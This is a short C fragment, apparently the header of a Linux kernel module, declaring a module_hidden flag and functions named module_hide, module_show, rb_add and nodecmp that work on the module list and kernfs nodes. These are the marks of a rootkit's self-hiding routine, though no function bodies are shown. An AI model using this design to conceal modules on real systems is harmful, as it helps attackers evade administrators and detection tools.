/**
Author: Mote

**/
#include <linux/module.h>    
#include <linux/kernel.h>   
#include <linux/init.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

static struct list_head *module_previous;
static struct kernfs_node *node;
static char module_hidden = 0;

int nodecmp(struct kernfs_node *kn, const unsigned int hash, const char *name, const void *ns);

void rb_add(struct kernfs_node *node);

void module_show(void);

void module_hide(void);
